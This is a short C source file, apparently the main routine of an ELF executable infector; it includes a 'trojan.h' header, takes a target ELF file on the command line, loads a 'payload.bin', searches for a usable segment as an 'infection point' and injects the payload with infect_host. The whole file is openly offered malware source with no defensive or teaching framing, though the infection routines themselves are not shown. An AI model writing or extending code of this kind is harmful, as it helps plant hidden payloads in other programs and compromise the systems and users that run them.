#include "trojan.h"



int main(int argc,char **argv)
{
        int opt;
        unsigned char *target_elf = NULL;


        while ((opt = getopt(argc, argv, "f:")) != -1) {
                switch (opt) {
            case 'f':
                target_elf = optarg;
                break;
                }
        }

        if(target_elf == NULL)
        {
           printf("Usage:%s -f \"Target ELF file wanted to infect\"\n", argv[0]);
           return 1;
        }

        open_map_file(target_elf);

        extract_payload("payload.bin");

        int segment = find_phdr();
        if(segment<0)
        {
                printf("unable to find usable infection point\n");
                exit(EXIT_FAILURE);
        }

        infect_host(segment);


        return 0;
}
